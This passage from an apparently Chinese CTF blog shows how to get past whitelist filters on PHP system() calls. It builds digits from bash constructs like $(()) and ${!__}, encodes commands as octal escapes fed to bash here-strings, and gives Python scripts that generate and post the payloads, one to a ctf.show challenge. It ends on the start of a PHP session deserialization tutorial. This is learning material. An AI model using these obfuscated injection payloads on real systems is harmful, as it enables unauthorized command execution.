class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
<p>去看了一下<a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p>再传入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
<p>解决方法同样使用两次bash，先试试，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。这三个思路就是文章提出的，个人感觉还是挺精妙的</p>
<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
<p>最终<code>ls</code>的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
<p>成功执行，其他的payload构造也是同理。</p>
<p>官方wp给了脚本（偷个懒），如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>



<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
<p>payload如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>自增需要抓包后url编码传参</strong></p>
<p>可以使用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>



<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>自增运算时传参需要url编码一下。</strong></p>
<p>利用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>自增等后面再来研究</p>
<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><h6 id="XYCTF-2024-ezRCE"><a href="#XYCTF-2024-ezRCE" class="headerlink" title="XYCTF 2024 - ezRCE"></a>XYCTF 2024 - ezRCE</h6><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">really ez?</span><br></pre></td></tr></table></figure>

<p>就是考的八进制数据，没有禁<code>&#39;</code>，先尝试直接<code>ls</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png" alt="image-20240603180726080"></p>
<p>读取根目录（<code>ls /</code>），可以如下构造：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt;$&#x27;\154\163\40\57&#x27;</span><br><span class="line">$0&lt;&lt;&lt;\$0\&lt;\&lt;\&lt;\$\&#x27;\\154\\163\\40\\57\&#x27;</span><br><span class="line">防止转义</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png" alt="image-20240603180945707"></p>
<p>最后读flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>

<p>读到flag</p>
<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>

<p>也可以成功读到flag。</p>
<p>注意知识点的融汇贯通。</p>
<p>其他的题可以看看</p>
<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
]]></content>
      <categories>
        <category>rce</category>
        <category>rce之利用shell变量</category>
      </categories>
  </entry>
  <entry>
    <title>session反序列化学习</title>
    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>好用，爱用，多用</p>
<span id="more"></span>

<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
<p><strong>PHP session：</strong></p>
<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>



<ul>
<li>session.save_handler&#x3D;””</li>
</ul>
<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
<ul>
<li><strong>session.serialize_handler</strong></li>
</ul>
<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
<p>并且文件的内容始终是session值的序列化之后的内容。</p>
<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>

<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
<ul>
<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
</li>
<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
</li>
</ul>
<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考文章1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<p>测试一下，demo如下：</p>
